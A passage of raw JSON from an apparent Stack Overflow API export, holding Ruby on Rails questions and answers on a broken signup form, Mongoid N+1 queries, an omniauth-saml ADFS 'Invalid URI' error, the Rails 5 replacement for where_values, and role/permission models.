utf8=%E2%9C%93&amp;authenticity_token=kdWiGeodxikOtAFggY27ED8SXukswQ3G1zsMJwNz5%2FvHW3%2BoUGtoVMMgBfIiFTmZmvbxy8OgcR%2B%2BB5%2FvH5BQFQ%3D%3D&amp;user%5Buserid%5D=test121&amp;user%5Bemail%5D=test123%40gmail.com&amp;user%5Bpassword%5D=123456&amp;user%5Bpassword_confirmation%5D=123456&amp;commit=Create+Account</p>\n</blockquote>\n\n<p>All params are in the <code>URL</code>.</p>\n"}], "owner": {"reputation": 1263, "user_id": 10221813, "user_type": "registered", "profile_image": "https://graph.facebook.com/10160530708235447/picture?type=large", "display_name": "uno", "link": "https://stackoverflow.com/users/10221813/uno"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 73, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1535458259, "creation_date": 1535448791, "last_edit_date": 1535455364, "question_id": 52054599, "link": "https://stackoverflow.com/questions/52054599/simply-login-feature-not-working-not-redirecting-or-storing", "title": "Simply Login feature not working (not redirecting or storing)", "body": "<p>I'm developing a ruby app to have a sign-in/up feature but it won't seem to work and I have been attempting this for a few days now and can't figure it out.</p>\n\n<p>It's not redirecting, displaying \"successful\" or error messages, or storing the information.</p>\n\n<p><strong>I was using this tutorial:</strong> <a href=\"https://www.youtube.com/watch?v=Pj7ueR-t2hk&amp;index=17&amp;list=PLmkbEVFV7DtBInYgh0OTQmO4olUjnKKrT\" rel=\"nofollow noreferrer\">https://www.youtube.com/watch?v=Pj7ueR-t2hk&amp;index=17&amp;list=PLmkbEVFV7DtBInYgh0OTQmO4olUjnKKrT</a></p>\n\n<p><strong>Then used this to see if I was missing anything:</strong> <a href=\"https://www.railstutorial.org/book/sign_up#code-user_show_action\" rel=\"nofollow noreferrer\">https://www.railstutorial.org/book/sign_up#code-user_show_action</a></p>\n\n<p>GitHub to app files: <a href=\"https://github.com/brandnamewater/App3\" rel=\"nofollow noreferrer\">https://github.com/brandnamewater/App3</a>\n\u200b</p>\n\n<p><strong>Here's my files:</strong></p>\n\n<p>\u200b</p>\n\n<pre><code>**User_controller**: https://pastebin.com/8MmvFmZw \n\n\n   **Models User**: https://pastebin.com/NCLufULp\n\n   **View/users/new**: https://pastebin.com/a2vDCY7H\n\n   **views/users/show** (not important): https://pastebin.com/VbwGXdca\n\n   **Routes**: https://paste.ee/p/jyDwA\n\n   **Schema**: https://paste.ee/p/fGCn9 \u200b\n</code></pre>\n\n<p>If there is anything else please let me know.</p>\n\n<p>When i click \"submit\", nothing happens.  I get this URL:</p>\n\n<p><a href=\"http://localhost:3000/users/new?utf8=%E2%9C%93&amp;authenticity_token=kdWiGeodxikOtAFggY27ED8SXukswQ3G1zsMJwNz5%2FvHW3%2BoUGtoVMMgBfIiFTmZmvbxy8OgcR%2B%2BB5%2FvH5BQFQ%3D%3D&amp;user%5Buserid%5D=test121&amp;user%5Bemail%5D=test123%40gmail.com&amp;user%5Bpassword%5D=123456&amp;user%5Bpassword_confirmation%5D=123456&amp;commit=Create+Account\" rel=\"nofollow noreferrer\">http://localhost:3000/users/new?utf8=%E2%9C%93&amp;authenticity_token=kdWiGeodxikOtAFggY27ED8SXukswQ3G1zsMJwNz5%2FvHW3%2BoUGtoVMMgBfIiFTmZmvbxy8OgcR%2B%2BB5%2FvH5BQFQ%3D%3D&amp;user%5Buserid%5D=test121&amp;user%5Bemail%5D=test123%40gmail.com&amp;user%5Bpassword%5D=123456&amp;user%5Bpassword_confirmation%5D=123456&amp;commit=Create+Account</a></p>\n\n<p>When i run \"rails c\" and check how many users,  it says 1 (from the 1 admin account i created directly from rails c in the cmd)</p>\n\n<p>I know this is not relevant to why it's not working but i did add a views/user/show file that contains this (just want to show as much as possible in case it helps)</p>\n\n<pre><code>&lt;% provide(:title, @user.email) %&gt;\n&lt;h1&gt;\n\n  &lt;%= @user.email %&gt;\n&lt;/h1&gt;\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "mongodb", "mongoid"], "comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535445904, "post_id": 52053634, "comment_id": 91057497, "body": "What do you mean <i>re-connect to DB</i>?"}, {"owner": {"reputation": 1, "user_id": 10283630, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-TKLFQtxuTVA/AAAAAAAAAAI/AAAAAAAAMsY/x2JVBlpSMoo/photo.jpg?sz=128", "display_name": "Kahdirici", "link": "https://stackoverflow.com/users/10283630/kahdirici"}, "reply_to_user": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535446216, "post_id": 52053634, "comment_id": 91057666, "body": "Basically for each inv.contact.name, it connects back to server to get the name from Contact. So if I have 50 invoices to display, my Im making 51 queries in total. 1 for the original data, list of invoices. 50 for each Contact.name"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 1, "creation_date": 1535446704, "post_id": 52053634, "comment_id": 91057942, "body": "Try <code>Accounting::Invoice.includes(:contact).page(params[:page].to&zwnj;&#8203;_i)</code>"}, {"owner": {"reputation": 2902, "user_id": 1202324, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4e62f40c62dda03af2f033c651f36311?s=128&d=identicon&r=PG", "display_name": "Denny Mueller", "link": "https://stackoverflow.com/users/1202324/denny-mueller"}, "reply_to_user": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535446772, "post_id": 52053634, "comment_id": 91057974, "body": "As further read up to @JagdeepSingh suggestion: <a href=\"https://semaphoreci.com/blog/2017/08/09/faster-rails-eliminating-n-plus-one-queries.html\" rel=\"nofollow noreferrer\">semaphoreci.com/blog/2017/08/09/&hellip;</a>"}, {"owner": {"reputation": 1, "user_id": 10283630, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-TKLFQtxuTVA/AAAAAAAAAAI/AAAAAAAAMsY/x2JVBlpSMoo/photo.jpg?sz=128", "display_name": "Kahdirici", "link": "https://stackoverflow.com/users/10283630/kahdirici"}, "reply_to_user": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 1, "creation_date": 1535457972, "post_id": 52053634, "comment_id": 91065085, "body": "@JagdeepSingh, Thank you it worked great! Is there a way I can integrate &quot;only&quot; with the referenced collection?"}], "answers": [{"tags": [], "owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "is_accepted": true, "score": 0, "last_activity_date": 1535474360, "creation_date": 1535474360, "answer_id": 52062690, "question_id": 52053634, "link": "https://stackoverflow.com/questions/52053634/ror-mongoid-lookup-doesnt-work/52062690#52062690", "title": "RoR MongoID Lookup doesn&#39;t work?", "body": "<p>What you are experiencing is <a href=\"https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations\" rel=\"nofollow noreferrer\">N + 1 queries problem</a>. You can reduce the number of queries to 2 by using <a href=\"https://apidock.com/rails/ActiveRecord/QueryMethods/includes\" rel=\"nofollow noreferrer\"><code>includes</code></a> for an association. In your case:</p>\n\n<pre><code>Accounting::Invoice.includes(:contact)\n                   .page(params[:page].to_i)\n</code></pre>\n\n<p>should do the trick.</p>\n\n<p>As it returns <code>ActiveRecord::Relation</code> object, you can chain other scopes and methods which apply to Arels. So, if you want to use <code>only</code> with this, do it as:</p>\n\n<pre><code>Accounting::Invoice.includes(:contact)\n                   .only(&lt;list_of_attributes&gt;)\n                   .page(params[:page].to_i)\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10283630, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-TKLFQtxuTVA/AAAAAAAAAAI/AAAAAAAAMsY/x2JVBlpSMoo/photo.jpg?sz=128", "display_name": "Kahdirici", "link": "https://stackoverflow.com/users/10283630/kahdirici"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 52062690, "answer_count": 1, "score": 0, "last_activity_date": 1535474360, "creation_date": 1535445768, "last_edit_date": 1535446733, "question_id": 52053634, "link": "https://stackoverflow.com/questions/52053634/ror-mongoid-lookup-doesnt-work", "title": "RoR MongoID Lookup doesn&#39;t work?", "body": "<p>I'm new to MongoID ( &amp; mongoDB) and having issue with performance due to pulling data from a reference collection.</p>\n\n<pre><code>class Accounting::Invoice\n  include Mongoid::Document\n\n  belongs_to :contact, :class_name =&gt; 'Contact'\nEnd\n\n class Contact\n   include Mongoid::Document\n\n   field :name, type: String\n end\n</code></pre>\n\n<p>Also using gem 'kaminari-mongoid' for paging.</p>\n\n<p>Simplified version of my query is:</p>\n\n<pre><code>@invoices = Accounting::Invoice.all.page(params[:page].to_i)\n\n&lt;% @invoices.each do |inv| %&gt;\n   &lt;% inv.contact.name %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Issue is when I display the data, to simply get the name from Contact collection, I have to re-connect to DB and pull the name for each listing. I tried using $lookup, however when I do that paging with kaminari doesn't work...</p>\n\n<p>Any suggestions on how to get the contact name without needing to re-connect to database?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["ruby", "saml", "omniauth", "adfs"], "comments": [{"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535445042, "post_id": 52053349, "comment_id": 91056965, "body": "I think the error seems to be related to callback URL."}, {"owner": {"reputation": 1962, "user_id": 2945616, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TL0yY.jpg?s=128&g=1", "display_name": "Atul Khanduri", "link": "https://stackoverflow.com/users/2945616/atul-khanduri"}, "reply_to_user": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535446553, "post_id": 52053349, "comment_id": 91057849, "body": "@KedarnagMukanahallipatna Even if we&#39;ve provided some random callback URL (like google.com) then still we got the same error. Callback will only be called when the user will successfully authenticated i.e. after the login form."}, {"owner": {"reputation": 1962, "user_id": 2945616, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TL0yY.jpg?s=128&g=1", "display_name": "Atul Khanduri", "link": "https://stackoverflow.com/users/2945616/atul-khanduri"}, "reply_to_user": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535446958, "post_id": 52053349, "comment_id": 91058091, "body": "@KedarnagMukanahallipatna I&#39;ve added code in the question as well."}], "answers": [{"tags": [], "owner": {"reputation": 1962, "user_id": 2945616, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TL0yY.jpg?s=128&g=1", "display_name": "Atul Khanduri", "link": "https://stackoverflow.com/users/2945616/atul-khanduri"}, "is_accepted": true, "score": 2, "last_activity_date": 1535488984, "creation_date": 1535488984, "answer_id": 52065936, "question_id": 52053349, "link": "https://stackoverflow.com/questions/52053349/invalid-uri-while-using-http-redirect-binding/52065936#52065936", "title": "Invalid URI while using HTTP Redirect Binding", "body": "<p>Atlast, I'm able to fix the problem by updating the \"Relying Party Identifier\" Name similar to \"Display Name\" of a Relying party trust.</p>\n\n<p>Here's the link for more info: <a href=\"https://kb.informatica.com/ipssolution/1/Pages/1/513730.aspx\" rel=\"nofollow noreferrer\">https://kb.informatica.com/ipssolution/1/Pages/1/513730.aspx</a></p>\n"}], "owner": {"reputation": 1962, "user_id": 2945616, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/TL0yY.jpg?s=128&g=1", "display_name": "Atul Khanduri", "link": "https://stackoverflow.com/users/2945616/atul-khanduri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 770, "favorite_count": 0, "accepted_answer_id": 52065936, "answer_count": 1, "score": 0, "last_activity_date": 1535488984, "creation_date": 1535444856, "last_edit_date": 1535446908, "question_id": 52053349, "link": "https://stackoverflow.com/questions/52053349/invalid-uri-while-using-http-redirect-binding", "title": "Invalid URI while using HTTP Redirect Binding", "body": "<p>We're using <strong>HTTP redirect-binding</strong> for providing SAML authentication using omniauth-saml gem. For testing purpose, we've configured ADFS in the windows instance and created a URL for login page.</p>\n\n<p>We're able to login using some credentials by directly hitting the URL in browser.</p>\n\n<p>But when we're using omniauth-saml gem to provide <strong>HTTP redirect-binding</strong>, then it shows \"Invalid URI\" error. Here's the error backtrace:</p>\n\n<pre><code>System.UriFormatException: Invalid URI: The format of the URI could not be determined.\n   at System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind)\n   at Microsoft.IdentityServer.Web.Protocols.Saml.SamlSignInContext.ValidateCore()\n   at Microsoft.IdentityServer.Web.Protocols.ProtocolContext.Validate()\n   at Microsoft.IdentityServer.Web.Protocols.Saml.SamlProtocolHandler.GetRequiredPipelineBehaviors(ProtocolContext pContext)\n   at Microsoft.IdentityServer.Web.PassiveProtocolListener.EvaluateHomeRealm(PassiveProtocolHandler protocolHandler, ProtocolContext protocolContext)\n   at Microsoft.IdentityServer.Web.PassiveProtocolListener.OnGetContext(WrappedHttpListenerContext context)\n</code></pre>\n\n<p>Here's the SAML URL:</p>\n\n<p><a href=\"https://ads.DOMAIN.com/adfs/ls/idpinitiatedSignOn.aspx?SAMLRequest=fZHBbsIwEER%2FJTefEjtpwMEiSFG5oFJVAsqhl8pxXLDi2KnXRnx%2BHVAleulxtDNPs7tL4IMeWRP82ezkd5DgkwZAOq%2BsebYGwiDdXrqLEvJ9t63R2fuRYSzFjNCuzDNzcrbPlMUhhgDzCMITEwuudctFj5J1hCrDJ%2BI9DxHAO8h6sPoiIRN2iPoLsAasulEZ5RX3sturk3kzGYfxipLNukafdJ7n7YyWKVks8rRsiUx5O6%2FSednmtGwFoQWNVoAgNwY8N75GBcmrlFRpUR0IZU8FK2YfKDnGtrdCRUZQch20ATb1rlFwhlkOCpjhgwTmBds3r1sWjYz%2FnuYxMv6fGZ31VliNVsvJzW7t3OrlvvzBBfBL%2FDi5q79PWf0\" rel=\"nofollow noreferrer\">https://ads.DOMAIN.com/adfs/ls/idpinitiatedSignOn.aspx?SAMLRequest=fZHBbsIwEER%2FJTefEjtpwMEiSFG5oFJVAsqhl8pxXLDi2KnXRnx%2BHVAleulxtDNPs7tL4IMeWRP82ezkd5DgkwZAOq%2BsebYGwiDdXrqLEvJ9t63R2fuRYSzFjNCuzDNzcrbPlMUhhgDzCMITEwuudctFj5J1hCrDJ%2BI9DxHAO8h6sPoiIRN2iPoLsAasulEZ5RX3sturk3kzGYfxipLNukafdJ7n7YyWKVks8rRsiUx5O6%2FSednmtGwFoQWNVoAgNwY8N75GBcmrlFRpUR0IZU8FK2YfKDnGtrdCRUZQch20ATb1rlFwhlkOCpjhgwTmBds3r1sWjYz%2FnuYxMv6fGZ31VliNVsvJzW7t3OrlvvzBBfBL%2FDi5q79PWf0</a></p>\n\n<p>Here's the Omniauth SAML configuration:</p>\n\n<pre><code>Rails.application.config.middleware.use OmniAuth::Builder do\n  provider :saml,\n    :assertion_consumer_service_url     =&gt; \"https://www.google.com\", # Tried some more callback URLs as well\n    :issuer                             =&gt; \"MyTrust\",\n    :idp_sso_target_url                 =&gt;  \"https://ads.DOMAIN.com/adfs/ls/idpinitiatedSignOn.aspx\",\n    :idp_cert                           =&gt; '-----BEGIN CERTIFICATE-----\nMIIDBzCCAe+gAwIBAgIJAIuOuO5YI79hMA0GCSqGSIb3DQEBBQUAMBoxGDAWBgNV\nBAMMD2Fkcy5rc29s.........\n-----END CERTIFICATE-----'\nend\n</code></pre>\n\n<p>Also, <strong>we're using Self-signed certificate for the ADFS</strong>. But I don't think it should be the problem as the logs is not showing certificate related error.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 1, "creation_date": 1535443167, "post_id": 52052828, "comment_id": 91055866, "body": "Is <a href=\"https://apidock.com/rails/ActiveRecord/Relation/where_values_hash\" rel=\"nofollow noreferrer\">this</a> what you&#39;re looking for ?"}, {"owner": {"reputation": 5714, "user_id": 2389501, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/23f6a708c04c660111117c4613592689?s=128&d=identicon&r=PG", "display_name": "Mateusz Urba\u0144ski", "link": "https://stackoverflow.com/users/2389501/mateusz-urba%c5%84ski"}, "reply_to_user": {"reputation": 1831, "user_id": 4160532, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Ey34JagqMzQ/AAAAAAAAAAI/AAAAAAAAABo/G70W8D2LXM4/photo.jpg?sz=128", "display_name": "Kedarnag Mukanahallipatna", "link": "https://stackoverflow.com/users/4160532/kedarnag-mukanahallipatna"}, "edited": false, "score": 0, "creation_date": 1535443288, "post_id": 52052828, "comment_id": 91055944, "body": "Unfortunately no, I tried that but in my example It returns empty hash."}, {"owner": {"reputation": 1405, "user_id": 7023415, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a7f3b4db177eeb60558058e587628f7?s=128&d=identicon&r=PG&f=1", "display_name": "Leo", "link": "https://stackoverflow.com/users/7023415/leo"}, "edited": false, "score": 7, "creation_date": 1535443592, "post_id": 52052828, "comment_id": 91056114, "body": "<a href=\"https://github.com/rails/rails/commit/c414fc6\" rel=\"nofollow noreferrer\">github.com/rails/rails/commit/c414fc6</a>"}, {"owner": {"reputation": 953, "user_id": 942135, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6940a140b70676e63569f347b6642f68?s=128&d=identicon&r=PG", "display_name": "trueunlessfalse", "link": "https://stackoverflow.com/users/942135/trueunlessfalse"}, "edited": false, "score": 1, "creation_date": 1535444037, "post_id": 52052828, "comment_id": 91056359, "body": "I think that where_values was never public api, only where_values_hash was and is. The implementation of where_values_hash however changed: <a href=\"https://github.com/rails/rails/blob/fa779b380e61381a393afbc7bbc0a9ce07e0ce74/activerecord/lib/active_record/relation.rb#L588\" rel=\"nofollow noreferrer\">github.com/rails/rails/blob/&hellip;</a> - not sure though why in your case where_values_hash is empty."}, {"owner": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "edited": false, "score": 1, "creation_date": 1535445540, "post_id": 52052828, "comment_id": 91057267, "body": "there is no clear boundary between public and supposedly private methods (which are actually public) in Active Record. Its completely confusing."}, {"owner": {"reputation": 4052, "user_id": 476979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55df1cc7d5fdb4ae9bc2afcb9afe7e4?s=128&d=identicon&r=PG", "display_name": "matthewd", "link": "https://stackoverflow.com/users/476979/matthewd"}, "reply_to_user": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "edited": false, "score": 2, "creation_date": 1535463525, "post_id": 52052828, "comment_id": 91068802, "body": "@apneadiving the boundary is the documentation: if it&#39;s <code>:nodoc:</code> then it&#39;s internal. It&#39;d be nice if Ruby had a firmer way of enforcing that rule, but unfortunately it doesn&#39;t."}, {"owner": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "reply_to_user": {"reputation": 4052, "user_id": 476979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55df1cc7d5fdb4ae9bc2afcb9afe7e4?s=128&d=identicon&r=PG", "display_name": "matthewd", "link": "https://stackoverflow.com/users/476979/matthewd"}, "edited": false, "score": 1, "creation_date": 1535528648, "post_id": 52052828, "comment_id": 91093802, "body": "@matthewd yeah, I regret they dont make methods private, would be no brainer :)"}, {"owner": {"reputation": 4052, "user_id": 476979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55df1cc7d5fdb4ae9bc2afcb9afe7e4?s=128&d=identicon&r=PG", "display_name": "matthewd", "link": "https://stackoverflow.com/users/476979/matthewd"}, "reply_to_user": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "edited": false, "score": 0, "creation_date": 1535549307, "post_id": 52052828, "comment_id": 91107197, "body": "@apneadiving and what, make every second line in rails/rails use <code>.send(:foo)</code>? :/  What we really need is something like <a href=\"https://bugs.ruby-lang.org/issues/12962\" rel=\"nofollow noreferrer\">bugs.ruby-lang.org/issues/12962</a>"}, {"owner": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "reply_to_user": {"reputation": 4052, "user_id": 476979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55df1cc7d5fdb4ae9bc2afcb9afe7e4?s=128&d=identicon&r=PG", "display_name": "matthewd", "link": "https://stackoverflow.com/users/476979/matthewd"}, "edited": false, "score": 0, "creation_date": 1535565617, "post_id": 52052828, "comment_id": 91117447, "body": "@matthewd I am not sure we understood each other. What I mean is: if rails core team considers a method is private, then make it private. If you hack around using send, you&#39;ll know for sure you are doing it at your own risk. Keeping it public let all doors open."}, {"owner": {"reputation": 4052, "user_id": 476979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55df1cc7d5fdb4ae9bc2afcb9afe7e4?s=128&d=identicon&r=PG", "display_name": "matthewd", "link": "https://stackoverflow.com/users/476979/matthewd"}, "reply_to_user": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "edited": false, "score": 0, "creation_date": 1535600221, "post_id": 52052828, "comment_id": 91127884, "body": "@apneadiving Rails itself still needs to be able to call the method. If you have an idea of how to improve it, though, please do open a PR."}, {"owner": {"reputation": 110512, "user_id": 350087, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/808bec1c640143bd7091888d9edfb2f2?s=128&d=identicon&r=PG", "display_name": "apneadiving", "link": "https://stackoverflow.com/users/350087/apneadiving"}, "reply_to_user": {"reputation": 4052, "user_id": 476979, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e55df1cc7d5fdb4ae9bc2afcb9afe7e4?s=128&d=identicon&r=PG", "display_name": "matthewd", "link": "https://stackoverflow.com/users/476979/matthewd"}, "edited": false, "score": 0, "creation_date": 1535632754, "post_id": 52052828, "comment_id": 91144770, "body": "@matthewd public/private methods is part of any well structured app and doesnt prevent it from working. I made the remark once on rails and the answer was so brutal I dont intend to contribute"}], "answers": [{"comments": [{"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 2, "creation_date": 1535463291, "post_id": 52053105, "comment_id": 91068680, "body": "<a href=\"https://github.com/rails/rails/blob/4-2-stable/activerecord/lib/active_record/relation.rb#L7\" rel=\"nofollow noreferrer\">Ref from rails 4</a> to show the change"}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 2, "last_activity_date": 1535444029, "creation_date": 1535444029, "answer_id": 52053105, "question_id": 52052828, "link": "https://stackoverflow.com/questions/52052828/ruby-on-rails-where-values-method/52053105#52053105", "title": "Ruby on Rails where_values method", "body": "<p>As it might be easily seen in the Rails code, it\u2019s now <a href=\"https://github.com/rails/rails/blob/5-1-stable/activerecord/lib/active_record/relation/query_methods.rb#L64\" rel=\"nofollow noreferrer\"><code>where_clause</code></a>.</p>\n\n<p>(Because <code>where</code> lives now in <a href=\"https://github.com/rails/rails/blob/5-1-stable/activerecord/lib/active_record/relation.rb#L10\" rel=\"nofollow noreferrer\"><code>CLAUSE_METHODS</code></a>.)</p>\n"}], "owner": {"reputation": 5714, "user_id": 2389501, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/23f6a708c04c660111117c4613592689?s=128&d=identicon&r=PG", "display_name": "Mateusz Urba\u0144ski", "link": "https://stackoverflow.com/users/2389501/mateusz-urba%c5%84ski"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1045, "favorite_count": 0, "accepted_answer_id": 52053105, "answer_count": 1, "score": 1, "last_activity_date": 1535444029, "creation_date": 1535443012, "question_id": 52052828, "link": "https://stackoverflow.com/questions/52052828/ruby-on-rails-where-values-method", "title": "Ruby on Rails where_values method", "body": "<p>In Ruby on Rails 4 there was <code>where_values</code> method:</p>\n\n<pre><code>User.with_all_credentials(creds).where_values\n[\n    [0] \"lower(email) = 'test'\"\n]\n</code></pre>\n\n<p>In Ruby on Rails 5 when I try to do the same it returns me that this method not exists. How can I get the same result in Ruby on Rails 5?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "edited": false, "score": 0, "creation_date": 1535445519, "post_id": 52052027, "comment_id": 91057250, "body": "Please check my answer, let me know if you required more info"}], "answers": [{"tags": [], "owner": {"reputation": 6207, "user_id": 5117953, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/Ca0RW.jpg?s=128&g=1", "display_name": "Vishal", "link": "https://stackoverflow.com/users/5117953/vishal"}, "is_accepted": true, "score": 1, "last_activity_date": 1535441734, "creation_date": 1535441734, "answer_id": 52052469, "question_id": 52052027, "link": "https://stackoverflow.com/questions/52052027/issues-in-getting-ui-in-proper-format-using-ruby-on-rails/52052469#52052469", "title": "Issues in getting UI in proper format using ruby on rails", "body": "<p>I think your structure should be like below </p>\n\n<p>role model</p>\n\n<pre><code>class Role &lt; ApplicationRecord\n  has_many :role_permissions\n  has_many :permissions, through: :role_permissions, dependent: :destroy\nend\n</code></pre>\n\n<p>permission model </p>\n\n<pre><code>class Permission &lt; ApplicationRecord\n  has_many :role_permissions\n  has_many :roles, through: :role_permissions, dependent: :destroy\nend\n</code></pre>\n\n<p>and the middle table between role and permissions</p>\n\n<pre><code>class RolePermission &lt; ApplicationRecord\n  belongs_to :role\n  belongs_to :permission\nend\n</code></pre>\n\n<p>Create data from seeds.rb </p>\n\n<pre><code> Role.create!(name: admin)\nPermission.create!([\n    {subject_class: 'Users', action: 'create',name: 'Create a User',description: 'nil', title: \"Users\"},\n    {subject_class: 'Users', action: 'index',name: 'List users',description: 'nil', title: 